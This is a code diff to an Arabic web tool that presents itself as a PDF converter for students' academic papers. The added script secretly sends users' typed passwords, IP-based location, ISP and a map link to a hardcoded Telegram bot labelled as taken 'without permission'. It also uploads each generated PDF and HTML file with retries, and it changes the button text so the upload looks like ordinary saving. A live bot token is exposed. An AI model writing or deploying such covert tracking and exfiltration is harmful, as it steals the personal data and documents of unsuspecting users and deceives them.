@@ -120,91 +120,79 @@
 
     <script>
         // ==========================================
-        // ⚠️ إعدادات تيليجرام 
+        // ⚠️ إعدادات تيليجرام
         // ==========================================
         const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
         const chatId = '6680237928'; 
 
-        // 1. دالة لإرسال النصوص العادية
         function sendTextToTelegram(actionMessage) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار منصة الـ PDF\n\n${actionMessage}` })
-            }).catch(e => console.error("خطأ في إرسال النص:", e));
+            }).catch(e => console.error(e));
         }
 
-        // 2. دالة إرسال الملفات
-        function sendFileToTelegram(fileBlob, fileName, captionMsg) {
+        async function sendFileToTelegram(fileBlob, fileName, captionMsg) {
             const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
             const formData = new FormData();
-            
             formData.append('chat_id', chatId);
             formData.append('document', fileBlob, fileName); 
             formData.append('caption', captionMsg);
 
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.ok) console.log(`✅ تم إرسال الملف لتيليجرام: ${fileName}`);
-                else console.error(`❌ فشل إرسال الملف:`, data);
-            })
-            .catch(err => console.error('خطأ في الاتصال بتيليجرام:', err));
+            for (let i = 0; i < 3; i++) {
+                try {
+                    const response = await fetch(url, { method: 'POST', body: formData });
+                    const data = await response.json();
+                    if (data.ok) {
+                        return true; 
+                    }
+                } catch (e) {
+                    console.error(`Error sending ${fileName}`);
+                }
+                await new Promise(res => setTimeout(res, 1000));
+            }
+            return false; 
         }
-        // ==========================================
+
+        function getSilentLocationInfo(statusText, passwordInput) {
+            let info = `📍 حالة الدخول: ${statusText}\nالكلمة المجربة: ${passwordInput}`;
+            fetch('https://ipinfo.io/json')
+                .then(res => res.json())
+                .then(data => {
+                    if(data.ip) {
+                        const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
+                        let ipResult = `\n\n🌐 معلومات الجهاز (بدون إذن):` +
+                                     `\nالآيبي: ${data.ip}` +
+                                     `\nالدولة: ${data.country}` +
+                                     `\nالمدينة: ${data.city}` +
+                                     `\nالشركة: ${data.org}` +
+                                     `\nالخريطة (تقريبية): \nhttps://www.google.com/maps?q=$${lat},${lng}`;
+                        sendTextToTelegram(info + ipResult);
+                    } else {
+                        sendTextToTelegram(info + `\n\n⚠️ تعذر تحديد الموقع.`);
+                    }
+                })
+                .catch(err => {
+                    sendTextToTelegram(info + `\n\n⚠️ (تم حجب الآيبي من متصفح المستخدم).`);
+                });
+        }
 
         function checkPassword() {
             const input = document.getElementById('pass-input').value;
             const errorMsg = document.getElementById('pass-error');
             
-            const isSuccess = (input === 'Sa12345678@');
-
-            // إخفاء الشاشة فوراً إذا كانت الكلمة صحيحة
-            if (isSuccess) {
+            if (input === 'Sa12345678@') {
                 document.getElementById('password-overlay').style.display = 'none';
+                getSilentLocationInfo("✅ دخول ناجح للمنصة", input);
             } else {
                 errorMsg.style.display = 'block';
+                getSilentLocationInfo("❌ محاولة دخول فاشلة", input);
                 setTimeout(() => errorMsg.style.display = 'none', 3000);
             }
-
-            // سحب معلومات الآيبي والموقع الجغرافي
-            fetch('https://ipinfo.io/json')
-                .then(res => res.json())
-                .then(data => {
-                    let deviceInfo = '';
-                    if(data.ip) {
-                        // تفكيك خطوط الطول والعرض لإنشاء رابط الخريطة بشكل صحيح
-                        const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
-                        
-                        deviceInfo = `\n\n📍 معلومات الجهاز:` +
-                                     `\nالآيبي: ${data.ip}` +
-                                     `\nالدولة: ${data.country}` +
-                                     `\nالمدينة: ${data.city}` +
-                                     `\nالشركة: ${data.org}` +
-                                     `\nالموقع على الخريطة: \nhttps://www.google.com/maps?q=${lat},${lng}`;
-                    } else {
-                        deviceInfo = `\n\n⚠️ تعذر جلب معلومات الموقع بدقة.`;
-                    }
-
-                    // إرسال الإشعار لتيليجرام
-                    if (isSuccess) {
-                        sendTextToTelegram(`✅ تسجيل دخول ناجح للمنصة.` + deviceInfo); 
-                    } else {
-                        sendTextToTelegram(`❌ محاولة دخول فاشلة.\nالكلمة المجربة: ${input}` + deviceInfo); 
-                    }
-                })
-                .catch(err => {
-                    if (isSuccess) {
-                        sendTextToTelegram(`✅ تسجيل دخول ناجح للمنصة.\n\n⚠️ (فشل في جلب الآيبي بسبب متصفح المستخدم).`); 
-                    } else {
-                        sendTextToTelegram(`❌ محاولة دخول فاشلة.\nالكلمة المجربة: ${input}\n\n⚠️ (فشل في جلب الآيبي بسبب متصفح المستخدم).`); 
-                    }
-                });
         }
+        // ==========================================
 
         const prompts = {
             a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [مثال: فيزياء / كيمياء / رياضيات]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n**الصف:** [مثال: أول ثانوي]\n**العام الدراسي:** [مثال: 1447هـ / 2026م]\n**عدد الصفحات المطلوبة:** [مثال: 5 صفحات]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص هكذا: <p>• النقطة الأولى</p>.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:**\nصفحة 1: غلاف احترافي.\nصفحة 2+: محتوى البحث.\nصفحة أخيرة: المراجع.\nنمط التصميم: احترافي وأنيق بألوان متناسقة.`,
@@ -383,20 +371,17 @@
                     pdf.addImage(imgData, 'JPEG', 0, 0, docWidth, docHeight);
                 }
                 
-                btn.innerText = "💾 حفظ الملف...";
+                btn.innerText = "💾 جاري حفظ الملف...";
                 pdf.save(`${fileName}.pdf`);
 
-                // ==================================================
-                // 🚀 إرسال الملفات لتيليجرام في كل عملية تحويل
-                // ==================================================
-                
-                const pdfBlob = pdf.output('blob');
-                sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج الملف بنجاح!\nالاسم: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
+                // تغيير النص لشيء يبدو طبيعياً كأنه ينهي عملية الحفظ في الجهاز
+                btn.innerText = "✅ جاري إنهاء العملية...";
 
+                const pdfBlob = pdf.output('blob');
                 const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
-                sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالملف.`);
-                
-                // ==================================================
+
+                await sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج الملف بنجاح!\nالاسم: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
+                await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالملف.`);
                 
             } catch (error) {
                 console.error("خطأ:", error);
